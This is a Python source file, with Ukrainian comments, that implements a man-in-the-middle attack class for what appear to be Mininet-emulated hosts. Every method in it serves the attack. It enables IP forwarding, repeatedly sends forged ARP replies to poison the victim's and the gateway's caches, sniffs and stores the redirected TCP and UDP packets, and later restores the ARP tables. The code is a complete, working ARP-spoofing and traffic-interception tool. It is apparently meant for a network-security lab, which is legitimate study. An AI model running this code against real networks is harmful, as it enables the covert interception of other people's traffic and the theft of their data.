from scapy.all import *
from mininet.log import info
import threading
import time


class MITMAttack:
    def __init__(self, attacker_host, victim_host, gateway_host):
        self.attacker = attacker_host
        self.victim = victim_host
        self.gateway = gateway_host
        self.attack_running = False
        self.captured_packets = []

    def enable_ip_forward(self):
        """Включення IP forwarding"""
        self.attacker.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')

    def disable_ip_forward(self):
        """Виключення IP forwarding"""
        self.attacker.cmd('echo 0 > /proc/sys/net/ipv4/ip_forward')

    def arp_poison(self):
        """ARP poisoning атака"""
        victim_ip = self.victim.IP()
        victim_mac = self.victim.MAC()
        gateway_ip = self.gateway.IP()
        gateway_mac = self.gateway.MAC()
        attacker_mac = self.attacker.MAC()

        poison_victim = ARP(
            op=2,
            psrc=gateway_ip,
            pdst=victim_ip,
            hwdst=victim_mac,
            hwsrc=attacker_mac
        )

        poison_gateway = ARP(
            op=2,
            psrc=victim_ip,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            hwsrc=attacker_mac
        )

        while self.attack_running:
            try:
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                time.sleep(2)
            except Exception as e:
                info(f'*** Error in ARP poisoning: {e}\n')
                break

    def packet_sniffer(self):
        """Перехоплення пакетів"""

        def packet_callback(packet):
            if packet.haslayer(TCP) or packet.haslayer(UDP):
                self.captured_packets.append(packet)

        sniff(
            iface=f"{self.attacker.name}-eth0",
            prn=packet_callback,
            store=False,
            stop_filter=lambda p: not self.attack_running
        )

    def start_attack(self):
        """Запуск MITM атаки"""
        self.attack_running = True
        self.enable_ip_forward()

        # Запуск ARP poisoning
        self.poison_thread = threading.Thread(target=self.arp_poison)
        self.poison_thread.daemon = True
        self.poison_thread.start()

        # Запуск сніффера
        self.sniffer_thread = threading.Thread(target=self.packet_sniffer)
        self.sniffer_thread.daemon = True
        self.sniffer_thread.start()

        info('*** MITM attack started\n')

    def stop_attack(self):
        """Зупинка атаки"""
        self.attack_running = False
        self.disable_ip_forward()

        # Зупинка потоків
        if hasattr(self, 'poison_thread'):
            self.poison_thread.join(timeout=2)
        if hasattr(self, 'sniffer_thread'):
            self.sniffer_thread.join(timeout=2)

        # Відновлення правильних ARP записів
        victim_ip = self.victim.IP()
        victim_mac = self.victim.MAC()
        gateway_ip = self.gateway.IP()
        gateway_mac = self.gateway.MAC()

        restore_victim = ARP(
            op=2,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
            pdst=victim_ip,
            hwdst=victim_mac
        )

        restore_gateway = ARP(
            op=2,
            psrc=victim_ip,
            hwsrc=victim_mac,
            pdst=gateway_ip,
            hwdst=gateway_mac
        )

        send(restore_victim, count=3, verbose=False)
        send(restore_gateway, count=3, verbose=False)

        info('*** MITM attack stopped\n')

    def get_captured_packets(self):
        """Отримання перехоплених пакетів"""
        return self.captured_packets